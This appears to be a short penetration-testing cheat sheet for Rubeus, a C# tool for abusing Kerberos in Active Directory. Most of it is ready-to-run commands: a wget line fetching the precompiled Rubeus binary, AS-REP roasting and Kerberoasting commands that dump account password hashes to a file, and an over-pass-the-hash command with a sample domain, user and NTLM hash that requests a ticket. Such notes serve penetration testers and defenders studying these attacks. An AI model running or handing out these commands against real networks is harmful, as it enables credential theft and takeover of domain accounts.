> A C# toolset for raw Kerberos interaction and abuses.


#Active_Directory_Authentication #NTLM_Hash

# Download

Download pre compiled binary
```
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe
```

# Usage

Use Rubeus to get the AS-REP hash (AS-REP Roasting)
- Get user password hashes that "Do not require Kerberos preauthentication"
```
.\Rubeus.exe asreproast /nowrap
```

Use Rubeus to get the TGS-REP hash (Kerberoasting)
- Get service account password hashes
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

#Over_Pass_the_Hash 

Use Rubeus to get the TGT (Over Pass the Hash)
```
.\Rubeus.exe asktgt /domain:hentai.com /user:salesman /ntlm:670094d6972f341be984cef6d8c93069 /ptt
```
- `asktgt`
	- Ask the KDC to generate a TGT ticket for us